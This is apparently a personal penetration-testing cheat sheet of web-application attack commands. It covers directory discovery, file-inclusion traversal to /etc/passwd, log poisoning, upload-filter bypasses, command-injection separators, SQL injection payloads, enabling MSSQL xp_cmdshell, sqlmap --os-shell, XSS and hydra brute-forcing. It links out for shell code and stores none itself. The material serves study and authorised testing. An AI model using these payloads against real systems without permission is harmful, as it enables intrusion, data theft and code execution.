# Web Application Testing Cheat Sheet

Quick command reference for web-app attacks. For the reasoning behind *why*
and *when* to reach for each technique, see
[Web Application Attacks](../methodology/web-application-attacks.md).

> Note: this file intentionally avoids pasting literal working webshell code
> or command-execution snippets — antivirus/Defender heuristics reliably
> flag plaintext files containing them, and it happened once already while
> building this repo. Where a technique needs one, the reference links below
> point to where to generate it fresh at exploitation time instead.

## Directory / content discovery

```bash
gobuster dir -u http://<TARGET_IP> -w <wordlist> -x php,txt,html,bak -b 403,404 -r
gobuster vhost -u http://<TARGET_IP> -w <subdomains-wordlist>
ffuf -u http://<TARGET_IP> -H "Host: FUZZ.<domain>" -w <subdomains-wordlist> -fw <false-positive-size>
nikto -h http://<TARGET_IP>
```

## Local / Remote File Inclusion

```bash
# Detect — common vulnerable params
?page= ?file= ?path= ?include=

# Basic traversal
../../../../etc/passwd
../../../../windows/win.ini

# Bypasses
..%2F..%2F..%2Fetc/passwd           # double-encoding
../../../../etc/passwd%00.jpg       # null byte (old PHP)
....//....//....//etc/passwd        # filter-evading traversal

# PHP wrappers — read source as base64 instead of executing it
php://filter/convert.base64-encode/resource=config.php
echo "<base64-output>" | base64 -d
```

**Data wrapper / log poisoning → RCE**: if `allow_url_include` is on, the
`data://` wrapper executes inline PHP passed directly in the URL. If it's
off, inject a short PHP snippet into a log the app will include (e.g. via
the User-Agent header hitting the Apache access log), then trigger it
through the LFI with a `cmd` parameter appended
(`?page=../../../../var/log/apache2/access.log&cmd=id`).

**RFI** — host a shell on the attacker box and include it remotely via the
vulnerable `page` parameter; same principle as log poisoning but the payload
comes from an attacker-controlled URL instead of a poisoned log.

## File upload bypass

```
1. Try the obvious: shell.php — if no filter, done.
2. Extension tricks: shell.php5 / .php7 / .phtml / .phar / shell.php.jpg / shell.jpg.php / shell.php%00.jpg
3. Magic bytes: prepend a valid image header before the payload to pass file-type sniffing.
4. Content-Type: in Burp, change the upload's Content-Type from application/x-php to image/jpeg.
```

Common upload paths to probe directly: `/upload`, `/uploads`, `/files`,
`/media`, `/wp-content/uploads` (WordPress).

## OS command injection

```bash
# Separators to test in any field that visibly shells out
; whoami
| whoami
`whoami`
$(whoami)
```

If injection is confirmed, chain in a reverse shell (see
[Shells, Transfer & Pivoting](./shells-transfer-pivoting.md)) through the
same injection point.

## SQL injection

```sql
-- Manual probes first
' or 1=1--
" or "1"="1"--
' ORDER BY 1--                    -- column count via error, increment until it errors

-- UNION-based
' UNION SELECT NULL,NULL,NULL--                                 -- match column count
' UNION SELECT username,password FROM users--
' UNION SELECT schema_name,NULL FROM information_schema.schemata--
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='<db>'--

-- Time-based blind (confirms injection when no output is visible)
' AND IF(1=1, sleep(3), 'false')--
```

With `FILE` privilege and a writable web root, `UNION SELECT ... INTO
OUTFILE` can write a file into the webroot directly — useful for planting a
webshell without a separate upload feature, though I generate the actual
shell contents at exploitation time rather than storing one here.

```bash
# MSSQL — enabling xp_cmdshell once you have DB access
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

```bash
# sqlmap — after manual confirmation, for speed
sqlmap -u "http://<TARGET_IP>/page.php?id=1" --cookie "<SESSION_COOKIE>" -p id --dbs
sqlmap -u "http://<TARGET_IP>/page.php?id=1" --cookie "<SESSION_COOKIE>" -p id -D <DB> -T <TABLE> --dump
sqlmap -r <REQUEST_FILE> -p <PARAM> --os-shell --web-root "<WRITABLE_WEBROOT>"
```

> I run manual injection probes before reaching for `sqlmap` — understanding
> *why* a payload works matters more than tool output, especially since
> automated SQLi tools aren't allowed in OSCP-style exams.

## API testing

```bash
gobuster dir -u http://<TARGET_IP>:<PORT> -w <wordlist> -p <pattern-file>
curl -i http://<TARGET_IP>:<PORT>/<api>/v1/users
curl -d '{"username":"<USER>","password":"<PW>"}' -H 'Content-Type: application/json' http://<TARGET_IP>:<PORT>/<api>/v1/login
```

## XSS

```bash
xsser --url "http://<TARGET_IP>/page.php?param=XSS" --Fp "<script>alert(1)</script>"
xsser --url "http://<TARGET_IP>/page.php?param=XSS" --cookie="<SESSION_COOKIE>" --Fp "<script>alert(1)</script>"
```

## Brute-force (hydra)

```bash
hydra -l <USER> -P <PASS_LIST> <TARGET_IP> http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
hydra -L <USERS_LIST> -P <PASS_LIST> <TARGET_IP> {ssh,ftp,smb}
```

## Reverse/web shells — where to get them, not stored here

- [PayloadsAllTheThings — web shells](https://github.com/swisskyrepo/PayloadsAllTheThings)
- Kali local copies: `/usr/share/webshells/`
- [revshells.com](https://www.revshells.com/) / [Pentestmonkey reverse shell cheat sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

## Burp Suite workflow (auth-flaw testing)

For username enumeration, brute-force logic flaws, and 2FA bypass — see the
reasoning in [Web Application Attacks](../methodology/web-application-attacks.md#phase-1--authentication-attacks).
Short version: **cluster bomb** for independent variables, **pitchfork**
when two lists must stay aligned, **Grep - Extract** on the exact error
message text to spot subtly different responses, and watch **response
time** columns, not just status codes.
